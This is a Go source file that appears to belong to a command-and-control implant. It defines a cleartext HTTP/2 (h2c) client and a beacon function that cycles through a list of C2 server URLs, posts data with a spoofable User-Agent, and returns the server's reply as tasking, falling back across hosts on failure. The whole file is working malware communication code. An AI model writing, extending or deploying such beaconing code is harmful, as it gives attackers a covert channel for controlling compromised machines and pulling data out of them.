//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"golang.org/x/net/http2"
)

var h2cTransport = &http2.Transport{
	AllowHTTP: true,
	DialTLS: func(network, addr string, tlsConfig *tls.Config) (net.Conn, error) {
		// Dial plain TCP for h2c (no TLS)
		return net.DialTimeout(network, addr, 30*time.Second)
	},
}

var h2cClient = &http.Client{
	Transport: h2cTransport,
	Timeout:   30 * time.Second,
}

func sendH2CBeacon(body []byte) []byte {
	startIdx := currentC2Idx
	for i := 0; i < len(C2URLs); i++ {
		idx := (startIdx + i) % len(C2URLs)
		c2URL := C2URLs[idx]

		if !strings.HasPrefix(c2URL, "h2c://") {
			continue
		}

		httpURL := "http://" + strings.TrimPrefix(c2URL, "h2c://")

		req, err := http.NewRequest(BeaconMethod, httpURL+BeaconURI, bytes.NewReader(body))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", UserAgent)

		// Upgrade to HTTP/2 via h2c (Upgrade: h2c)
		req.Header.Set("Upgrade", "h2c")
		req.Header.Set("HTTP2-Settings", "")

		resp, err := h2cClient.Do(req)
		if err != nil {
			if Debug {
				fmt.Printf("[!] H2C beacon to %s failed: %v\n", c2URL, err)
			}
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode != 200 {
			if Debug {
				fmt.Printf("[!] H2C %s returned %d\n", c2URL, resp.StatusCode)
			}
			continue
		}

		data, err := io.ReadAll(resp.Body)
		if err != nil {
			continue
		}
		currentC2Idx = idx
		if Debug {
			fmt.Printf("[+] H2C Beacon OK from %s, response %d bytes\n", c2URL, len(data))
		}
		return data
	}
	return nil
}
